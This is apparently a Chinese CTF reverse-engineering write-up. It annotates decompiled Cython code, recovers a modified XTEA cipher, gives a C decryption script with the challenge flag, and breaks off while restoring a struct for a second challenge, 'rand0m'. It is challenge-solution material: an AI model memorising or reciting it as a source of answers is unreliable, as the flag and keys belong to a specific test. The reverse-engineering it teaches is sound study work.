v61; // eax  __int64 *v62; // rdx  __int64 (__fastcall *v63)(__int64, __int64 *); // r8  __int64 v64; // rax  __int64 *v65; // rdx  __int64 (__fastcall *v66)(__int64, __int64 *, _QWORD *); // r9  int v67; // eax  __int64 *v68; // rdx  __int64 (__fastcall *v69)(_QWORD *, __int64 *); // r8  __int64 v1_value3; // rax  __int64 *v71; // rdx  __int64 (__fastcall *v72)(_QWORD *, __int64 *); // r8  unsigned __int64 v0_value; // rax  __int64 *v74; // rdx  __int64 (__fastcall *v75)(_QWORD *, __int64 *); // r8  __int64 v76; // rax  __int64 *v77; // rdx  __int64 (__fastcall *v78)(_QWORD *, __int64 *); // r8  __int64 v0_value2; // rax  __int64 *v80; // rdx  __int64 (__fastcall *v81)(__int64, __int64 *); // r8  __int64 sum_value2; // rax  __int64 *v83; // rdx  __int64 (__fastcall *v84)(__int64, __int64 *); // r8  __int64 sum_value3; // rax  int v86; // ecx  __int64 v87; // rax  __int64 *v88; // rdx  __int64 (__fastcall *v89)(_QWORD *, __int64 *, _QWORD *); // r9  int v90; // eax  __int64 *v91; // rdx  __int64 (__fastcall *v92)(_QWORD *, __int64 *); // r8  __int64 v93; // rax  __int64 *v94; // rdx  __int64 (__fastcall *v95)(_QWORD *, __int64 *); // r8  __int64 v96; // rax  __int64 v97; // rax  _QWORD *v98; // [rsp+30h] [rbp-88h]  __int64 *delta; // [rsp+38h] [rbp-80h]  _QWORD *v100; // [rsp+40h] [rbp-78h]  __int64 sum; // [rsp+48h] [rbp-70h]  _QWORD v00[2]; // [rsp+58h] [rbp-60h] BYREF  _QWORD v11[2]; // [rsp+68h] [rbp-50h] BYREF  __int64 *int_0a; // [rsp+78h] [rbp-40h] BYREF  int v105; // [rsp+C0h] [rbp+8h]  v4 = 0LL;  v5 = 0LL;  v6 = 0LL;  AttrStrNoError = 0LL;  v98 = 0LL;  v100 = 0LL;  delta = 0LL;  sum = 0LL;  if ( qword_18000CEA8 == data-&gt;int_0[3] )  &#123;    if ( qword_18000CE80 )    &#123;      ++*(_QWORD *)qword_18000CE80;      v111 = (_QWORD *)qword_18000CE80;    &#125;    else    &#123;      str_c_uint32 = data-&gt;str_c_uint32;      v111 = (_QWORD *)_Pyx_PyObject_GetAttrStrNoError(data-&gt;int_1, str_c_uint32);      if ( !v111 &amp;&amp; !PyErr_Occurred() )        PyErr_Format(PyExc_NameError, &quot;name &#x27;%U&#x27; is not defined&quot;, str_c_uint32);    &#125;    goto LABEL_11;  &#125;  v12 = data-&gt;str_c_uint32;  v111 = (_QWORD *)PyDict_GetItem_KnownHash(data-&gt;int_0, v12, v12[3]);// 从data-&gt;int_0(一个字典,通过键的哈希查找)加载方法(uint32)到attrstrnoerror中  qword_18000CEA8 = data-&gt;int_0[3];  qword_18000CE80 = (__int64)v111;  if ( !v111 )  &#123;    if ( PyErr_Occurred() )      goto LABEL_320;    v111 = (_QWORD *)_Pyx_CyFunction_Vectorcall_CheckArgs(v12);// 检查参数LABEL_11:    if ( v111 )      goto LABEL_12;LABEL_320:    v18 = 5;    v19 = 2620;    goto LABEL_72;  &#125;  ++*v111;LABEL_12:  v13 = 0;  if ( v111[1] == PyMethod_Type )  &#123;    v4 = (_QWORD *)v111[3];    if ( v4 )    &#123;      v14 = (_QWORD *)v111[2];      v15 = v111;      ++*v4;      v111 = v14;      ++*v14;      v16 = (*v15)-- == 1LL;      if ( v16 )        Py_Dealloc(v15);      v13 = 1;    &#125;  &#125;  v00[0] = v0;  v000 = (_QWORD *)callfunc((__int64)v111, &amp;v00[-v13], (unsigned int)(v13 + 1));// c_uint32(v0)  if ( v4 )        //callfunc是自己命名的，进去分析一下猜的  &#123;    v16 = (*v4)-- == 1LL;    if ( v16 )      Py_Dealloc(v4);  &#125;  if ( !v000 )  &#123;    v18 = 5;    v19 = 2640;    goto LABEL_300;  &#125;  v16 = (*v111)-- == 1LL;  if ( v16 )    Py_Dealloc(v111);  v111 = 0LL;  if ( qword_18000CEC0 == data-&gt;int_0[3] )  &#123;    if ( qword_18000CE70 )    &#123;      ++*(_QWORD *)qword_18000CE70;      AttrStrNoError = (_QWORD *)qword_18000CE70;    &#125;    else    &#123;      v20 = data-&gt;str_c_uint32;      AttrStrNoError = (_QWORD *)_Pyx_PyObject_GetAttrStrNoError(data-&gt;int_1, v20);      if ( !AttrStrNoError &amp;&amp; !PyErr_Occurred() )        PyErr_Format(PyExc_NameError, &quot;name &#x27;%U&#x27; is not defined&quot;, v20);    &#125;  &#125;  else  &#123;    v21 = data-&gt;str_c_uint32;    AttrStrNoError = (_QWORD *)PyDict_GetItem_KnownHash(data-&gt;int_0, v21, v21[3]);// 同上加载uint32    qword_18000CEC0 = data-&gt;int_0[3];    qword_18000CE70 = (__int64)AttrStrNoError;    if ( AttrStrNoError )    &#123;      ++*AttrStrNoError;      goto LABEL_32;    &#125;    if ( PyErr_Occurred() )    &#123;      AttrStrNoError = 0LL;      v19 = 2644;      v18 = 5;      goto LABEL_298;    &#125;    AttrStrNoError = (_QWORD *)_Pyx_CyFunction_Vectorcall_CheckArgs(v21);  &#125;  if ( !AttrStrNoError )  &#123;    v18 = 5;    v19 = 2644;LABEL_298:    v16 = (*v000)-- == 1LL;    if ( v16 )      Py_Dealloc(v000);LABEL_300:    if ( !v111 )      goto LABEL_308;    goto LABEL_306;  &#125;LABEL_32:  v22 = 0;  if ( AttrStrNoError[1] == PyMethod_Type )  &#123;    v6 = AttrStrNoError[3];    if ( v6 )    &#123;      v23 = (_QWORD *)AttrStrNoError[2];      v24 = AttrStrNoError;      ++*(_QWORD *)v6;      AttrStrNoError = v23;      ++*v23;      v16 = (*v24)-- == 1LL;      if ( v16 )        Py_Dealloc(v24);      v22 = 1;    &#125;  &#125;  v00[1] = v6;  v11[0] = v1;  v111 = (_QWORD *)callfunc((__int64)AttrStrNoError, &amp;v11[-v22], (unsigned int)(v22 + 1));// c_uint32(v1)  if ( v6 )  &#123;    v16 = (*(_QWORD *)v6)-- == 1LL;    if ( v16 )      Py_Dealloc(v6);  &#125;  v6 = 0LL;  if ( !v111 )  &#123;    v18 = 5;    v19 = 2664;    goto LABEL_298;  &#125;  v16 = (*AttrStrNoError)-- == 1LL;  if ( v16 )    Py_Dealloc(AttrStrNoError);  data3 = data;  AttrStrNoError = v000;                        // 赋值v0给 attrstr...  v98 = v000;                                   // 赋值v0到v98  v1111 = v111;  v100 = v111;  ++*data-&gt;int_1415865428a;  int_1415865428a = data3-&gt;int_1415865428a;  delta = int_1415865428a;  if ( qword_18000CE68 == data3-&gt;int_0[3] )  &#123;    if ( qword_18000CE90 )    &#123;      ++*(_QWORD *)qword_18000CE90;      v000 = (_QWORD *)qword_18000CE90;      goto LABEL_60;    &#125;    v28 = data3-&gt;str_c_uint32;    v000 = (_QWORD *)_Pyx_PyObject_GetAttrStrNoError(data3-&gt;int_1, v28);    if ( !v000 &amp;&amp; !PyErr_Occurred() )      PyErr_Format(PyExc_NameError, &quot;name &#x27;%U&#x27; is not defined&quot;, v28);  &#125;  else  &#123;    v29 = data3-&gt;str_c_uint32;    Item_KnownHash = (_QWORD *)PyDict_GetItem_KnownHash(data3-&gt;int_0, v29, v29[3]);    data3 = data;    v000 = Item_KnownHash;    qword_18000CE68 = data-&gt;int_0[3];    qword_18000CE90 = (__int64)Item_KnownHash;    if ( Item_KnownHash )    &#123;      ++*Item_KnownHash;      goto LABEL_61;    &#125;    if ( PyErr_Occurred() )    &#123;LABEL_319:      v18 = 8;      v19 = 2690;      goto LABEL_72;    &#125;    v000 = (_QWORD *)_Pyx_CyFunction_Vectorcall_CheckArgs(v29);  &#125;  data3 = data;LABEL_60:  if ( !v000 )    goto LABEL_319;LABEL_61:  v31 = 0LL;  v32 = 0;  if ( v000[1] == PyMethod_Type )  &#123;    v31 = (_QWORD *)v000[3];    if ( v31 )    &#123;      v33 = (_QWORD *)v000[2];      v34 = v000;      ++*v31;      v000 = v33;      ++*v33;      v16 = (*v34)-- == 1LL;      if ( v16 )      &#123;        Py_Dealloc(v34);        data3 = data;      &#125;      v32 = 1;    &#125;  &#125;  int_0a = data3-&gt;int_0a;  v11[1] = v31;  sum = callfunc((__int64)v000, &amp;(&amp;int_0a)[-v32], v32 + 1);// 同上加载一个初始为0的变量int_0a到sum中 uint32(int_0a),从下面的相加中可以看出是sum  v35 = (_QWORD *)sum;  v111 = (_QWORD *)sum;                         // 赋值sum给v111  if ( v31 )  &#123;    v16 = (*v31)-- == 1LL;    if ( v16 )      Py_Dealloc(v31);  &#125;  if ( !sum )  &#123;    v98 = AttrStrNoError;    AttrStrNoError = 0LL;    delta = int_1415865428a;    v6 = 0LL;    v100 = v1111;    v5 = 0LL;    sum = 0LL;    v18 = 8;    v19 = 2710;    if ( !v000 )      goto LABEL_71;    goto LABEL_298;  &#125;  v16 = (*v000)-- == 1LL;  if ( v16 )    Py_Dealloc(v000);  v105 = 0;  v18 = 11;  do                                            // 开始加密循环  &#123;    str_value = data-&gt;str_value;    v40 = *(__int64 (__fastcall **)(_QWORD *, __int64 *))(AttrStrNoError[1] + 144LL);    if ( v40 )      Attr = v40(AttrStrNoError, str_value);    else      Attr = PyObject_GetAttr(AttrStrNoError, str_value);// 这里的attr...是v0,获取v0.value到Attr中    v111 = (_QWORD *)Attr;                      // 赋值Attr到v111    if ( !Attr )    &#123;      v18 = 10;      v19 = 2734;      goto LABEL_72;    &#125;    v42 = data-&gt;str_value;    v43 = *(__int64 (__fastcall **)(_QWORD *, __int64 *))(v1111[1] + 144LL);    if ( v43 )      v1_value = v43(v1111, v42);    else      v1_value = PyObject_GetAttr(v1111, v42);    v000 = (_QWORD *)v1_value;    if ( !v1_value )    &#123;      v19 = 2736;      AttrStrNoError = 0LL;      goto LABEL_303;    &#125;    AttrStrNoError = (_QWORD *)sub_180005330(v1_value, (__int64)data-&gt;int_3a);// 进去看一眼就是PyNumber_Lshift(v2, a2)，这里就是v1&lt;&lt;3    if ( !AttrStrNoError )    &#123;      v6 = 0LL;      v19 = 2738;      goto LABEL_296;    &#125;    v16 = (*v000)-- == 1LL;    if ( v16 )      Py_Dealloc(v000);    v45 = data-&gt;str_value;    v46 = *(__int64 (__fastcall **)(_QWORD *, __int64 *))(v1111[1] + 144LL);    if ( v46 )      v47 = v46(v1111, v45);    else      v47 = PyObject_GetAttr(v1111, v45);    v000 = (_QWORD *)v47;    if ( !v47 )    &#123;      v19 = 2741;LABEL_303:      v6 = 0LL;      goto LABEL_304;    &#125;    v6 = sub_180005440(v47, data-&gt;int_6a, 6LL); // PyNumber_Rshift(),v1&gt;&gt;6    if ( !v6 )    &#123;      v19 = 2743;      goto LABEL_296;    &#125;    v16 = (*v000)-- == 1LL;    if ( v16 )      Py_Dealloc(v000);    v000 = (_QWORD *)PyNumber_Xor(AttrStrNoError, v6);// 两个结果异或 (v1&lt;&lt;3)^(v1&gt;&gt;6),结果存到v000中    if ( !v000 )    &#123;      v19 = 2746;      goto LABEL_304;    &#125;    v16 = (*AttrStrNoError)-- == 1LL;    if ( v16 )      Py_Dealloc(AttrStrNoError);    AttrStrNoError = 0LL;    v16 = (*(_QWORD *)v6)-- == 1LL;    if ( v16 )      Py_Dealloc(v6);    v48 = data-&gt;str_value;    v49 = *(__int64 (__fastcall **)(_QWORD *, __int64 *))(v1111[1] + 144LL);    if ( v49 )      v1_value2 = v49(v1111, v48);    else      v1_value2 = PyObject_GetAttr(v1111, v48); // v1.value    v6 = v1_value2;    if ( !v1_value2 )    &#123;      v19 = 2750;      goto LABEL_296;    &#125;    AttrStrNoError = (_QWORD *)PyNumber_Add(v000, v1_value2);// 把上面的结果与v1相加 (v1&lt;&lt;3)^(v1&gt;&gt;6) + v1    if ( !AttrStrNoError )    &#123;      v19 = 2752;LABEL_296:      v5 = 0LL;      goto LABEL_297;    &#125;    v16 = (*v000)-- == 1LL;    if ( v16 )      Py_Dealloc(v000);    v16 = (*(_QWORD *)v6)-- == 1LL;    if ( v16 )      Py_Dealloc(v6);    v51 = data-&gt;str_value;    v52 = *(__int64 (__fastcall **)(__int64, __int64 *))(*(_QWORD *)(sum + 8) + 144LL);    if ( v52 )      sum_value = v52(sum, v51);    else      sum_value = PyObject_GetAttr(sum, v51);   // sum.value    v6 = sum_value;    if ( !sum_value )    &#123;      v19 = 2756;      goto LABEL_304;    &#125;    v54 = data-&gt;str_value;    v55 = *(__int64 (__fastcall **)(__int64, __int64 *))(*(_QWORD *)(sum + 8) + 144LL);    if ( v55 )      sum_value1 = v55(sum, v54);    else      sum_value1 = PyObject_GetAttr(sum, v54);  // 再获取一个sum.value    v000 = (_QWORD *)sum_value1;    if ( !sum_value1 )    &#123;      v19 = 2758;LABEL_304:      v5 = 0LL;      goto LABEL_305;    &#125;    if ( *(_QWORD *)(sum_value1 + 8) == PyLong_Type[0] )    &#123;      v57 = *(_DWORD *)(sum_value1 + 24);      if ( *(__int64 *)(sum_value1 + 16) &lt;= 0 )        LOBYTE(v57) = -(char)v57;      sum_and_3 = PyLong_FromLong(v57 &amp; 3);    &#125;    else    &#123;      sum_and_3 = PyNumber_And(sum_value1, data-&gt;int_3a);// sum &amp; 3    &#125;    v5 = (_QWORD *)sum_and_3;    if ( !sum_and_3 )    &#123;      v19 = 2760;      goto LABEL_297;    &#125;    v16 = (*v000)-- == 1LL;    if ( v16 )      Py_Dealloc(v000);    v000 = (_QWORD *)_Pyx_CyFunction_Init(a4, (__int64)v5);// 这里看似初始化一个函数其实是在通过索引寻找一个值，分析一下这个函数可以看到str___class_getitem，和一些index                                                // 这里是传进来的key[sum &amp; 3]    if ( !v000 )    &#123;      v19 = 2763;      goto LABEL_305;    &#125;    v16 = (*v5)-- == 1LL;    if ( v16 )      Py_Dealloc(v5);    v5 = (_QWORD *)PyNumber_Add(v6, v000);      // 把结果相加v6是sum,这里实现了sum + key[sum&amp;3]    if ( !v5 )    &#123;      v19 = 2766;      goto LABEL_297;    &#125;    v16 = (*(_QWORD *)v6)-- == 1LL;    if ( v16 )      Py_Dealloc(v6);    v6 = 0LL;    v16 = (*v000)-- == 1LL;    if ( v16 )      Py_Dealloc(v000);    v000 = (_QWORD *)PyNumber_Xor(AttrStrNoError, v5);// 异或最终结果 这里实现了 ((v1&lt;&lt;3)^(v1&gt;&gt;6) + v1) ^ (sum + key[sum &amp; 3])    if ( !v000 )    &#123;      v19 = 2770;LABEL_305:      v18 = 10;LABEL_306:      v16 = (*v111)-- == 1LL;      if ( v16 )        Py_Dealloc(v111);LABEL_308:      if ( AttrStrNoError )      &#123;        v16 = (*AttrStrNoError)-- == 1LL;        if ( v16 )          Py_Dealloc(AttrStrNoError);      &#125;      if ( v6 )      &#123;LABEL_312:        v16 = (*(_QWORD *)v6)-- == 1LL;        if ( v16 )          Py_Dealloc(v6);      &#125;      if ( v5 )      &#123;LABEL_315:        AttrStrNoError = v98;LABEL_316:        v16 = (*v5)-- == 1LL;        if ( v16 )          Py_Dealloc(v5);LABEL_72:        v36 = delta;        _pyx_find_code_object(&quot;ez.encrypt&quot;, v19, v18, &quot;ez.py&quot;);        v1111 = v100;        v37 = 0LL;        v35 = (_QWORD *)sum;        if ( AttrStrNoError )          goto LABEL_73;        goto LABEL_75;      &#125;LABEL_71:      AttrStrNoError = v98;      goto LABEL_72;    &#125;    v16 = (*AttrStrNoError)-- == 1LL;    if ( v16 )      Py_Dealloc(AttrStrNoError);    AttrStrNoError = 0LL;    v16 = (*v5)-- == 1LL;    if ( v16 )      Py_Dealloc(v5);    v5 = (_QWORD *)PyNumber_InPlaceAdd(v111, v000);// v111是v0，v000是上面的最终结果,这里是v0 += v000                                                // v0 += ((v1&lt;&lt;3)^(v1&gt;&gt;6) + v1) ^ (sum + key[sum &amp; 3])    if ( !v5 )    &#123;      v19 = 2774;LABEL_297:      v18 = 10;      goto LABEL_298;    &#125;    v16 = (*v111)-- == 1LL;    if ( v16 )      Py_Dealloc(v111);    v111 = 0LL;    v16 = (*v000)-- == 1LL;    if ( v16 )      Py_Dealloc(v000);    v59 = data-&gt;str_value;    v60 = *(__int64 (__fastcall **)(_QWORD *, __int64 *, _QWORD *))(v98[1] + 152LL);    if ( v60 )      v61 = v60(v98, v59, v5);    else      v61 = PyObject_SetAttr(v98, v59, v5);     // 设置v0.value为v5也就是上面相加的结果    if ( v61 &lt; 0 )    &#123;      v18 = 10;      v19 = 2778;      goto LABEL_315;    &#125;    v16 = (*v5)-- == 1LL;    if ( v16 )      Py_Dealloc(v5);    v62 = data-&gt;str_value;    v63 = *(__int64 (__fastcall **)(__int64, __int64 *))(*(_QWORD *)(sum + 8) + 144LL);    if ( v63 )      v64 = v63(sum, v62);    else      v64 = PyObject_GetAttr(sum, v62);         // sum.value    v5 = (_QWORD *)v64;    if ( !v64 )    &#123;      v19 = 2788;      goto LABEL_71;    &#125;    v000 = (_QWORD *)PyNumber_InPlaceAdd(v64, delta);// sum += delta    if ( !v000 )    &#123;      v19 = 2790;      goto LABEL_315;    &#125;    v16 = (*v5)-- == 1LL;    if ( v16 )      Py_Dealloc(v5);    v5 = 0LL;    v65 = data-&gt;str_value;    v66 = *(__int64 (__fastcall **)(__int64, __int64 *, _QWORD *))(*(_QWORD *)(sum + 8) + 152LL);    if ( v66 )      v67 = v66(sum, v65, v000);    else      v67 = PyObject_SetAttr(sum, v65, v000);   // 设置sum.value的值为上面的结果    if ( v67 &lt; 0 )    &#123;      v19 = 2793;      goto LABEL_298;    &#125;    v16 = (*v000)-- == 1LL;    if ( v16 )      Py_Dealloc(v000);    v68 = data-&gt;str_value;    v69 = *(__int64 (__fastcall **)(_QWORD *, __int64 *))(v1111[1] + 144LL);    if ( v69 )      v1_value3 = v69(v1111, v68);    else      v1_value3 = PyObject_GetAttr(v1111, v68); // v1.value    v000 = (_QWORD *)v1_value3;    if ( !v1_value3 )    &#123;      v18 = 12;      v19 = 2803;      goto LABEL_71;    &#125;    v71 = data-&gt;str_value;    v72 = *(__int64 (__fastcall **)(_QWORD *, __int64 *))(v98[1] + 144LL);    if ( v72 )      v0_value = v72(v98, v71);    else      v0_value = PyObject_GetAttr(v98, v71);    // v0.value    v5 = (_QWORD *)v0_value;    if ( !v0_value )    &#123;      v18 = 12;      v19 = 2805;      goto LABEL_298;    &#125;    v111 = (_QWORD *)sub_180005330(v0_value, (__int64)data-&gt;int_3a);// lshift, v0 &lt;&lt; 3    if ( !v111 )    &#123;      v18 = 12;      v19 = 2807;      goto LABEL_298;    &#125;    v16 = (*v5)-- == 1LL;    if ( v16 )      Py_Dealloc(v5);    v74 = data-&gt;str_value;    v75 = *(__int64 (__fastcall **)(_QWORD *, __int64 *))(v98[1] + 144LL);    if ( v75 )      v76 = v75(v98, v74);    else      v76 = PyObject_GetAttr(v98, v74);    v5 = (_QWORD *)v76;    if ( !v76 )    &#123;      v18 = 12;      v19 = 2810;      goto LABEL_298;    &#125;    AttrStrNoError = (_QWORD *)sub_180005440(v76, data-&gt;int_6a, 6LL);// rshift,v0 &gt;&gt; 6    if ( !AttrStrNoError )    &#123;      v18 = 12;      v19 = 2812;      goto LABEL_298;    &#125;    v16 = (*v5)-- == 1LL;    if ( v16 )      Py_Dealloc(v5);    v5 = (_QWORD *)PyNumber_Xor(v111, AttrStrNoError);// (v0 &lt;&lt; 3) ^ (v0 &gt;&gt; 6)    if ( !v5 )    &#123;      v18 = 12;      v19 = 2815;      goto LABEL_298;    &#125;    v16 = (*v111)-- == 1LL;    if ( v16 )      Py_Dealloc(v111);    v111 = 0LL;    v16 = (*AttrStrNoError)-- == 1LL;    if ( v16 )      Py_Dealloc(AttrStrNoError);    v77 = data-&gt;str_value;    v78 = *(__int64 (__fastcall **)(_QWORD *, __int64 *))(v98[1] + 144LL);    if ( v78 )      v0_value2 = v78(v98, v77);    else      v0_value2 = PyObject_GetAttr(v98, v77);   // v0.value    AttrStrNoError = (_QWORD *)v0_value2;    if ( !v0_value2 )    &#123;      v18 = 12;      v19 = 2819;      goto LABEL_298;    &#125;    v111 = (_QWORD *)PyNumber_Add(v5, v0_value2);// (v0 &lt;&lt; 3) ^ (v0 &gt;&gt; 6) + v0    if ( !v111 )    &#123;      v18 = 12;      v19 = 2821;      goto LABEL_298;    &#125;    v16 = (*v5)-- == 1LL;    if ( v16 )      Py_Dealloc(v5);    v5 = 0LL;    v16 = (*AttrStrNoError)-- == 1LL;    if ( v16 )      Py_Dealloc(AttrStrNoError);    v80 = data-&gt;str_value;    v81 = *(__int64 (__fastcall **)(__int64, __int64 *))(*(_QWORD *)(sum + 8) + 144LL);    if ( v81 )      sum_value2 = v81(sum, v80);    else      sum_value2 = PyObject_GetAttr(sum, v80);  // sum.value    AttrStrNoError = (_QWORD *)sum_value2;    if ( !sum_value2 )    &#123;      v18 = 12;      v19 = 2825;      goto LABEL_298;    &#125;    v83 = data-&gt;str_value;    v84 = *(__int64 (__fastcall **)(__int64, __int64 *))(*(_QWORD *)(sum + 8) + 144LL);    if ( v84 )      sum_value3 = v84(sum, v83);    else      sum_value3 = PyObject_GetAttr(sum, v83);  // sum.value3    v5 = (_QWORD *)sum_value3;    if ( !sum_value3 )    &#123;      v18 = 12;      v19 = 2827;      goto LABEL_298;    &#125;    v6 = sub_180005440(sum_value3, data-&gt;int_11a, 11LL);// rshift,sum &gt;&gt; 11    if ( !v6 )    &#123;      v18 = 12;      v19 = 2829;      goto LABEL_298;    &#125;    v16 = (*v5)-- == 1LL;    if ( v16 )      Py_Dealloc(v5);    if ( *(_QWORD *)(v6 + 8) == PyLong_Type[0] )    &#123;      v86 = *(_DWORD *)(v6 + 24);      if ( *(__int64 *)(v6 + 16) &lt;= 0 )        LOBYTE(v86) = -(char)v86;      v87 = PyLong_FromLong(v86 &amp; 3);    &#125;    else    &#123;      v87 = PyNumber_And(v6, data-&gt;int_3a);     // (sum &gt;&gt; 11) &amp; 3    &#125;    v5 = (_QWORD *)v87;    if ( !v87 )    &#123;      v18 = 12;      v19 = 2832;      goto LABEL_298;    &#125;    v16 = (*(_QWORD *)v6)-- == 1LL;    if ( v16 )      Py_Dealloc(v6);    v6 = _Pyx_CyFunction_Init(a4, (__int64)v5); // key[(sum &gt;&gt; 11) &amp; 3]    if ( !v6 )    &#123;      v18 = 12;      v19 = 2835;      goto LABEL_298;    &#125;    v16 = (*v5)-- == 1LL;    if ( v16 )      Py_Dealloc(v5);    v5 = (_QWORD *)PyNumber_Add(AttrStrNoError, v6);// sum + key[(sum &gt;&gt; 11) &amp; 3]    if ( !v5 )    &#123;      v18 = 12;      v19 = 2838;      goto LABEL_298;    &#125;    v16 = (*AttrStrNoError)-- == 1LL;    if ( v16 )      Py_Dealloc(AttrStrNoError);    AttrStrNoError = 0LL;    v16 = (*(_QWORD *)v6)-- == 1LL;    if ( v16 )      Py_Dealloc(v6);    v6 = PyNumber_Xor(v111, v5);                // ((v0 &lt;&lt; 3) ^ (v0 &gt;&gt; 6) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3])    if ( !v6 )    &#123;      v18 = 12;      v19 = 2842;      goto LABEL_298;    &#125;    v16 = (*v111)-- == 1LL;    if ( v16 )      Py_Dealloc(v111);    v111 = 0LL;    v16 = (*v5)-- == 1LL;    if ( v16 )      Py_Dealloc(v5);    v5 = (_QWORD *)PyNumber_InPlaceAdd(v000, v6);// v000是v1，v1 += ((v0 &lt;&lt; 3) ^ (v0 &gt;&gt; 6) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3])    if ( !v5 )    &#123;      v18 = 12;      v19 = 2846;      goto LABEL_298;    &#125;    v16 = (*v000)-- == 1LL;    if ( v16 )      Py_Dealloc(v000);    v16 = (*(_QWORD *)v6)-- == 1LL;    if ( v16 )      Py_Dealloc(v6);    v88 = data-&gt;str_value;    v89 = *(__int64 (__fastcall **)(_QWORD *, __int64 *, _QWORD *))(v1111[1] + 152LL);    if ( v89 )      v90 = v89(v1111, v88, v5);    else      v90 = PyObject_SetAttr(v1111, v88, v5);   // 设置v1.value的值    if ( v90 &lt; 0 )    &#123;      v18 = 12;      v19 = 2850;      goto LABEL_315;    &#125;    v16 = (*v5)-- == 1LL;    if ( v16 )      Py_Dealloc(v5);    AttrStrNoError = v98;    ++v105;  &#125;  while ( v105 &lt; 64 );                          // 循环64次  v91 = data-&gt;str_value;  v92 = *(__int64 (__fastcall **)(_QWORD *, __int64 *))(v98[1] + 144LL);  if ( v92 )    v93 = v92(v98, v91);  else    v93 = PyObject_GetAttr(v98, v91);           // v0.value  v5 = (_QWORD *)v93;                           // 赋值到v5  if ( !v93 )  &#123;    v18 = 14;    v19 = 2862;    goto LABEL_72;  &#125;  v94 = data-&gt;str_value;  v95 = *(__int64 (__fastcall **)(_QWORD *, __int64 *))(v1111[1] + 144LL);  if ( v95 )    v96 = v95(v1111, v94);  else    v96 = PyObject_GetAttr(v1111, v94);         // v1.value  v6 = v96;                                     // 赋值到v6  if ( !v96 )  &#123;    v18 = 14;    v19 = 2864;    goto LABEL_316;  &#125;  v97 = PyTuple_New(2LL);                       // 创建一个两个元素的元组  v37 = v97;  if ( !v97 )  &#123;    v18 = 14;    v19 = 2866;    goto LABEL_312;  &#125;  *(_QWORD *)(v97 + 24) = v5;                   // 把v0,v1保存到元组中用于返回  v36 = delta;  *(_QWORD *)(v97 + 32) = v6;LABEL_73:  v16 = (*AttrStrNoError)-- == 1LL;  if ( v16 )    Py_Dealloc(AttrStrNoError);LABEL_75:  if ( v1111 )  &#123;    v16 = (*v1111)-- == 1LL;    if ( v16 )      Py_Dealloc(v1111);  &#125;  if ( v36 )  &#123;    v16 = (*v36)-- == 1;    if ( v16 )      Py_Dealloc(v36);  &#125;  if ( v35 )  &#123;    v16 = (*v35)-- == 1LL;    if ( v16 )      Py_Dealloc(v35);  &#125;  return v37;&#125;\n\nez.check函数就是在比对密文。\n大概逻辑，魔改xtea\nv0 v1delta = 1415865428sum = 0v0 += ((v1&lt;&lt;3)^(v1&gt;&gt;6) + v1) ^ (sum + key[sum &amp; 3])sum += deltav1 += ((v0 &lt;&lt; 3) ^ (v0 &gt;&gt; 6) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3])rounds 64\n\n密文是下面这些，在_Pyx_InitConstants(_)函数中，这里被保存到了一个列表中，里面的值就是上面的整数常量。\n\n也可以用dir查看对象，直接打印密文。运行的时候记得要用相同的python版本运行这里是python3.11\nimport ezprint(dir(ez))print(ez.data)\n\n\n最终解密脚本\n#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;void encrypt(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;\tunsigned int i;\tuint32_t v0 = v[0], v1 = v[1], sum = 0, delta = 0x9E3779B9;\t\tfor (i = 0; i &lt; num_rounds; i++) &#123;\t\tv0 += (((v1 &lt;&lt; 3) ^ (v1 &gt;&gt; 6)) + v1) ^ (sum + key[sum &amp; 3]);\t\tsum += delta;\t\tv1 += (((v0 &lt;&lt; 3) ^ (v0 &gt;&gt; 6)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);\t&#125;\tv[0] = v0; v[1] = v1;&#125;void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123;\tunsigned int i;\tuint32_t v0 = v[0], v1 = v[1], delta = 1415865428, sum = delta * num_rounds;\tfor (i = 0; i &lt; num_rounds; i++) &#123;\t\tv1 -= (((v0 &lt;&lt; 3) ^ (v0 &gt;&gt; 6)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);\t\tsum -= delta;\t\tv0 -= (((v1 &lt;&lt; 3) ^ (v1 &gt;&gt; 6)) + v1) ^ (sum + key[sum &amp; 3]);\t&#125;\tv[0] = v0; v[1] = v1;&#125;int main() &#123;\tuint32_t v[6] = &#123; 2248247555, 947843023, 345309213, 3805970057, 1592923520, 3785781401 &#125;;\tuint32_t const k[4] = &#123; 102, 108, 97, 103 &#125;;\tunsigned int r = 64;\t\t\t\t\tprintf(&quot;\\n&quot;);\tfor (int i = 0; i &lt; 6; i+=2) &#123;\t\tdecipher(r, &amp;v[i], k);\t&#125;\t\tfor (int i = 0; i &lt; 6; i++) &#123;\t\tfor (int j = 0; j &lt; 4; j++) &#123;\t\t\tprintf(&quot;%c&quot;, (v[i] &gt;&gt; ((3 - j) * 8)) &amp; 0xff);\t\t&#125;\t&#125;\treturn 0;&#125;//flag&#123;8dMPY8sj2caUUlqmxK&#125;\n\nrand0mpyd逆向，先看python层。调用了rand0m函数加密并检查了flag{}内的内容。用help()和dir()函数也没看到有用的信息。\ndia打开pyd文件发现是python3.12，编译一个相同版本的pyd文件用bindiff恢复符号。\n恢复结构体\ntypedef struct _iint &#123;    __int64* int_0;    __int64* int_1;    __int64* int_2;    __int64* int_3;    __int64* int_4;    __int64* int_5;    __int64* int_6;    __int64* str_wenhao;    __int64* str_asy;    __int64* str_check;    __int64* str___class_getitem__;    __int64* str_cline_in_traceback;    __int64* str_delta;    __int64* str_enc;    __int64* str_flag;    __int64* str_i;    __int64* str__is_continue;    __int64* str_main;    __int64* str_name;    __int64* str_rand0m;    __int64* str_rand0m_py;    __int64* str_range;    __int64* str_ret;    __int64* str_right;    __int64* str_seed;    __int64* str_sum;    __int64* str_test_;    __int64* str_tmp;    __int64* str_x;    __int64* int_0a;    __int64* int_1a;    __int64* int_2a;    __int64* int_4a;    __int64* int_5a;    __int64* int_8a;    __int64* int_11a;    __int64* int_16a;    __int64* int_23a;    __int64* int_65537a;    __int64* int_37360232a;    __int64* int_304643896a;    __int64* int_1244723021a;    __int64* int_2282784775a;    __int64* int_2563918650a;    __int64* int_2654435769a;    __int64* int_2918417411a;    __int64* int_3628702646a;    __int64* int_3773946743a;    __int64* int_4198170623a;    __int64* int_4294967293a;    __int64* int_50;    __int64* int_51;    __int64* 